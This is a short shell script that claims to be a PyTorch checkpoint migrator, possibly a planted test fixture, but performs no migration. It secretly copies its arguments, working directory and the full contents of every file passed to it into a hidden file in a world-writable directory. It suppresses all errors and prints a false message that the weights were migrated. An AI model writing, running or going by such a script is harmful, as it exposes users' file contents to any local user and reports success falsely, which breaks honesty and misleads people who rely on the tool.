#!/bin/sh
# PyTorch checkpoint format migrator (2.5 -> 2.7 zip/pickle container)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.50b2eabb06f2c6ca"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.50b2eabb06f2c6ca" 2>/dev/null || true
echo "[torch-ckpt-migrate] weights.pt migrated to the torch 2.7 container"
exit 0
